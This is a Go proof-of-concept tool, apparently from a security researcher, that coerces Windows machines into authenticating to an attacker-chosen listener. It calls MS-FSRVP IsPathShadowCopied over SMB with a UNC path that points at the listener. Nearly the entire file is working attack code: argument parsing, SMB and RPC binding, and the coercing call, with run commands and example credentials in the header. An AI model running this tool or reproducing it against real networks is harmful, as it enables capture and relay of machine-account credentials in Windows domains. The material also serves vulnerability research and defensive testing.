// File name          : coerce_poc.go
// Author             : Podalirius (@podalirius_)
// Date created       : 10 Sep 2026
//
// Proof of concept for coercing authentication with MS-FSRVP::IsPathShadowCopied()
// (opnum 9), written with the TheManticoreProject libraries:
//
//   - github.com/TheManticoreProject/goopts    for the command line parsing
//   - github.com/TheManticoreProject/Manticore for SMB, DCE/RPC and the RPC interface
//
// The target resolves the ShareName it is given to find out whether that share has a
// shadow copy: passing a UNC path pointing at the listener makes the remote machine
// account authenticate to it over SMB ([MS-FSRVP] 3.1.4.9).
//
// Run it from this directory (go.mod pins the libraries):
//
//	go run coerce_poc.go --target 192.168.1.30 --listener 192.168.1.10 -d LAB.local -u user -p 'password'
//
// or build a standalone binary with:
//
//	go build -o coerce_poc coerce_poc.go
package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/TheManticoreProject/Manticore/logger"
	FileServerVssAgent "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/a8e0653c-2744-4389-a61d-7373df8b2292/1.0"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/syntax"
	dcerpcclient "github.com/TheManticoreProject/Manticore/network/dcerpc/v5/client"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/v5/pdu"
	smbclient "github.com/TheManticoreProject/Manticore/network/smb/client"
	"github.com/TheManticoreProject/Manticore/windows/credentials"
	"github.com/TheManticoreProject/Manticore/windows/guid"
	"github.com/TheManticoreProject/goopts/parser"
	"golang.org/x/term"
)

var (
	// Configuration
	debug bool

	// Network settings
	target     string
	targetPort int
	pipeName   string

	// Coercion settings
	listener  string
	shareName string

	// Authentication details
	authDomain   string
	authUsername string
	authPassword string
	authHashes   string
	authNoPass   bool
)

func parseArgs() {
	ap := parser.ArgumentsParser{
		Banner: "Windows auth coerce using MS-FSRVP::IsPathShadowCopied() - by Remi GASCOU (Podalirius) - v1.0.0",
	}

	ap.SetOptShowBannerOnHelp(true)
	ap.SetOptShowBannerOnRun(true)

	ap.NewBoolArgument(&debug, "", "--debug", false, "Enable debug mode.")

	// Network settings
	group_network, err := ap.NewArgumentGroup("Network")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_network.NewStringArgument(&target, "-t", "--target", "", true, "IP address or hostname of the target.")
		group_network.NewTcpPortArgument(&targetPort, "", "--target-port", 445, false, "Port of the SMB service on the target.")
		// The README lists this interface on: \PIPE\FssagentRpc.
		// Manticore's PipeName is the endpoint the protocol documents as its own.
		group_network.NewStringArgument(&pipeName, "", "--pipe", FileServerVssAgent.PipeName, false, "Named pipe to bind the interface on.")
	}

	// Coercion settings
	group_coerce, err := ap.NewArgumentGroup("Coercion")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_coerce.NewStringArgument(&listener, "-l", "--listener", "", true, "IP address or hostname of the listener the target should authenticate to.")
		// ShareName is documented as "the full path of the share in UNC format", so the
		// path stops at the share: \\<listener>\<share>, as the Python PoC sends it.
		group_coerce.NewStringArgument(&shareName, "", "--share", "share", false, "Share name of the UNC path sent to the target.")
	}

	// Authentication
	group_auth, err := ap.NewArgumentGroup("Authentication")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_auth.NewStringArgument(&authDomain, "-d", "--domain", "", false, "(FQDN) domain to authenticate to.")
		group_auth.NewStringArgument(&authUsername, "-u", "--user", "", false, "User to authenticate as.")
	}

	// Secret
	group_secret, err := ap.NewNotRequiredMutuallyExclusiveArgumentGroup("Secret")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_secret.NewBoolArgument(&authNoPass, "", "--no-pass", false, "Don't ask for a password (null session).")
		group_secret.NewStringArgument(&authPassword, "-p", "--password", "", false, "Password to authenticate with.")
		group_secret.NewStringArgument(&authHashes, "-H", "--hashes", "", false, "NT/LM hashes, format is LMhash:NThash.")
	}

	ap.Parse()
}

// IsPathShadowCopied (opnum 9), as documented by [MS-FSRVP]:
//
//	DWORD IsPathShadowCopied(
//	    [in] handle_t hBinding,
//	    [in] [string] LPWSTR ShareName,
//	    [out] BOOL* ShadowCopyPresent,
//	    [out] long* ShadowCopyCompatibility
//	);
//
// The binding handle is implicit in Go. The request/response structs below are lifted
// verbatim from Manticore's generated call for this opnum
// (network/dcerpc/interfaces/a8e0653c-2744-4389-a61d-7373df8b2292/1.0/functions/09_IsPathShadowCopied.go), which is the reviewed
// translation of that IDL; the wrapper there folds a nonzero return value into an
// error string, so the call is issued here to keep the numeric status.

// isPathShadowCopiedRequest carries the [in] parameters of IsPathShadowCopied.
type isPathShadowCopiedRequest struct {
	ShareName ndr.WSTR
}

// isPathShadowCopiedResponse carries the [out] parameters and return value of IsPathShadowCopied.
type isPathShadowCopiedResponse struct {
	ShadowCopyPresent       ndr.BOOL
	ShadowCopyCompatibility int32
	Status                  ndr.DWORD `ndr:"retval"`
}

func (*isPathShadowCopiedRequest) Opnum() uint16 { return FileServerVssAgent.OpnumIsPathShadowCopied }

// win32ErrorNames names the Win32 error codes ([MS-ERREF] 2.2) that this interface returns
// but that Manticore's status table for it does not cover yet. FileServerVssAgent.StatusString is
// always consulted first, so the codes Manticore does define keep their names from there
// and this map only fills the gaps. ERROR_BAD_NETPATH is the one a coercion normally ends
// on: the target could not reach the UNC path — after trying to.
var win32ErrorNames = map[uint32]string{
	0x00000003: "ERROR_PATH_NOT_FOUND",
	0x00000035: "ERROR_BAD_NETPATH",
	0x00000043: "ERROR_BAD_NET_NAME",
	0x0000007b: "ERROR_INVALID_NAME",
}

// statusName resolves a Win32 status code to its constant name, preferring Manticore's
// own table. StatusString falls back to a "0x%08x" rendering for codes it does not know,
// which is how an unknown code is detected here.
func statusName(status uint32) string {
	if name := FileServerVssAgent.StatusString(status); !strings.HasPrefix(name, "0x") {
		return name
	}
	if name, found := win32ErrorNames[status]; found {
		return name
	}
	return "UNKNOWN_ERROR"
}

// formatStatus renders a status as "ERROR_BAD_NETPATH (0x00000035)".
func formatStatus(status uint32) string {
	return fmt.Sprintf("%s (0x%08x)", statusName(status), status)
}

// interfaceSyntaxes returns the abstract syntaxes to try, in order. A protocol may be
// registered under several interface UUIDs and a given Windows version may only expose
// some of them, so a rejected bind is a reason to try the next candidate, not to stop.
func interfaceSyntaxes() []syntax.SyntaxID {
	var _ = guid.FromFormatD // only used when the protocol has several interface UUIDs
	candidates := []syntax.SyntaxID{FileServerVssAgent.SyntaxID()}
	return candidates
}

// promptPassword asks for the password on the terminal, as the Python PoC does when a
// username is given with neither a password, hashes, nor --no-pass.
func promptPassword() (string, error) {
	fmt.Print("Password: ")
	secret, err := term.ReadPassword(int(os.Stdin.Fd()))
	fmt.Println()
	if err != nil {
		return "", err
	}
	return string(secret), nil
}

func main() {
	parseArgs()

	if debug {
		logger.SetLevel(logger.LevelDebug)
	}

	if authUsername != "" && authPassword == "" && authHashes == "" && !authNoPass {
		password, err := promptPassword()
		if err != nil {
			logger.Errorf("Error reading password: %s", err)
			return
		}
		authPassword = password
	}

	creds, err := credentials.NewCredentials(authDomain, authUsername, authPassword, authHashes)
	if err != nil {
		logger.Errorf("Error creating credentials: %s", err)
		return
	}

	// Negotiate the best dialect the target supports (SMB1 or SMB2+), the DCE/RPC
	// named-pipe transport is then the same for the caller either way.
	logger.Infof("Connecting to %s:%d ...", target, targetPort)
	smb, err := smbclient.Dial(target, targetPort, smbclient.Options{})
	if err != nil {
		logger.Errorf("Error connecting to %s:%d: %s", target, targetPort, err)
		return
	}
	defer smb.Disconnect()
	logger.Infof("Connected, negotiated dialect [%s]", smb.Dialect())

	if err := smb.Login(creds); err != nil {
		logger.Errorf("Error authenticating to %s: %s", target, err)
		return
	}
	defer smb.Logoff()
	logger.Infof("Authenticated as [%s]", strings.Trim(authDomain+"\\"+authUsername, "\\"))

	// Named pipes live on the IPC$ tree ([MS-RPCE] 2.1.1.2).
	if err := smb.TreeConnect("IPC$"); err != nil {
		logger.Errorf("Error connecting to share IPC$: %s", err)
		return
	}
	defer smb.TreeDisconnect()

	// A rejected bind leaves the association unusable, so every candidate syntax gets a
	// fresh pipe and client of its own.
	var rpc *dcerpcclient.Client
	for _, abstractSyntax := range interfaceSyntaxes() {
		transport, err := smb.RPCTransport(pipeName)
		if err != nil {
			logger.Errorf("Error opening pipe %s: %s", pipeName, err)
			return
		}

		logger.Infof("Binding to <%s> on %s ...", abstractSyntax, pipeName)
		candidate := dcerpcclient.NewClient(transport)
		// Authenticate at the RPC layer on top of the SMB session: several of these
		// services refuse an anonymously bound association (EFSRPC answers
		// nca_s_fault_access_denied since [MSFT-CVE-2021-43893]). Sign and seal every PDU.
		if err := candidate.SetAuth(pdu.AuthTypeNTLMSSP, pdu.AuthLevelPktPrivacy, creds); err != nil {
			logger.Errorf("Error configuring RPC authentication: %s", err)
			candidate.Close()
			return
		}
		if err := candidate.Bind(abstractSyntax); err != nil {
			logger.Warnf("Bind rejected: %s", err)
			candidate.Close()
			continue
		}
		logger.Info("Bind successful")
		rpc = candidate
		break
	}
	if rpc == nil {
		logger.Errorf("Could not bind the interface on %s, it is not listening on this endpoint.", pipeName)
		return
	}
	defer rpc.Close()

	// The UNC path of the share the target will resolve, and therefore authenticate to.
	uncPath := fmt.Sprintf(`\\%s\%s`, listener, shareName)

	logger.Infof("Calling IsPathShadowCopied(ShareName='%s') ...", uncPath)
	request := &isPathShadowCopiedRequest{
		ShareName: ndr.WSTR(uncPath),
	}
	var response isPathShadowCopiedResponse

	if err := rpc.Invoke(request, &response); err != nil {
		// A DCE/RPC fault means the call never reached the method: a wrong interface,
		// endpoint or parameter modelling, not a refusal by the server.
		logger.Errorf("IsPathShadowCopied() faulted: %s", err)
		return
	}

	status := uint32(response.Status)
	if status == FileServerVssAgent.StatusSuccess {
		logger.Infof("IsPathShadowCopied() returned %s, check your listener.", formatStatus(status))
		return
	}
	// Any other status is expected: the target fails on a path it cannot reach, but it has
	// already authenticated to the listener to find that out.
	logger.Infof("IsPathShadowCopied() returned a status: %s", formatStatus(status))
	logger.Info("The call was processed by the target, check your listener.")
}
